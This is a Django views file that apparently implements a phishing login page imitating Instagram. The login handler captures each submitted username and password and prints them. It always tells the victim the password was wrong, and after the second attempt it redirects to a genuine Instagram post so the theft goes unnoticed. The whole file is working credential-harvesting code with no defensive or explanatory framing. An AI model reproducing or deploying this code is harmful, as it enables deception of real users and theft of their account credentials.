# yourappname/views.py

from django.shortcuts import render,redirect
from django.contrib import messages
import json
import os
def index(request):
    click_count = request.session.get('click_count', 0)
    return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
def login_view(request):
    success_message = None

    if request.method == 'POST':
        click_count = request.session.get('click_count', 0)
        click_count += 1
        request.session['click_count'] = click_count
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Save form data to the database
        user_data = {'username': username, 'password': password}
        print(user_data)
        success_message = 'Sorry, your password was incorrect. Please double-check your password.'
        messages.success(request, success_message)
        if click_count == 2:
            # Click count ko reset karein
            request.session['click_count'] = 0
            return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')

    return render(request, 'myapp/index.html', {'success_message': success_message})